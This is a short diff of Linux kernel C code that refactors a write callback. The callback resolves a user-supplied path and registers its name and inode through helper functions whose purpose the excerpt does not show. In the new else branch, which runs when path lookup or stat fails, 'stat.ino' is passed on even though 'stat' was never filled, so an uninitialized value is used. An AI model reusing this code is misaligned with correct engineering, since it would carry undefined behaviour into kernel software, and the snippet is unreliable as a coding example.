@@ -550,20 +550,17 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
                     struct kstat stat;
                     struct path path;
 
-                    if (!kern_path(s, LOOKUP_FOLLOW, &path)) {
-                        if (!vfs_getattr(&path, &stat, STATX_BASIC_STATS,
-                                    AT_STATX_SYNC_AS_STAT)) {
-                            if (*s != '.' && *s != '/') {
-                                tmp[0] = s;
-                                fs_add_name_rw(tmp, stat.ino);
-                            } else {
-                                /** It is filename, no problem because we have path.dentry */
-                                const char *f = kstrdup(path.dentry->d_name.name, GFP_KERNEL);
-                                path_put(&path);
-                                tmp[0] = f;
-                                fs_add_name_rw(tmp, stat.ino);
-                                kv_mem_free(&f);
-                            }
+                    if (fs_kern_path(s, &path) && fs_file_stat(&path, &stat)) {
+                        /** It is filename, no problem because we have path.dentry */
+                        const char *f = kstrdup(path.dentry->d_name.name, GFP_KERNEL);
+                        path_put(&path);
+                        tmp[0] = f;
+                        fs_add_name_rw(tmp, stat.ino);
+                        kv_mem_free(&f);
+                    } else {
+                        if (*s != '.' && *s != '/') {
+                            tmp[0] = s;
+                            fs_add_name_rw(tmp, stat.ino);
                         }
                     }
                 }
